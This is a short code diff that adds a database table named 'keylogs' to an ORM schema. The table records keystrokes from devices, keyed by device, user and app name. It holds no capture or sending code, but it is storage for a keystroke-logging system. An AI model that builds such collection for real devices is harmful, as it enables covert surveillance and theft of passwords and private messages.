@@ -25,4 +25,18 @@ export const users = mysqlTable("users", {
 export type User = typeof users.$inferSelect;
 export type InsertUser = typeof users.$inferInsert;
 
+// Keylogs table for tracking device keystrokes
+export const keylogs = mysqlTable("keylogs", {
+  id: int("id").autoincrement().primaryKey(),
+  deviceId: varchar("deviceId", { length: 64 }).notNull(),
+  userId: int("userId").notNull(),
+  appName: varchar("appName", { length: 255 }).notNull(),
+  keyText: text("keyText").notNull(),
+  isDeleted: int("isDeleted").default(0).notNull(),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+});
+
+export type Keylog = typeof keylogs.$inferSelect;
+export type InsertKeylog = typeof keylogs.$inferInsert;
+
 // TODO: Add your tables here
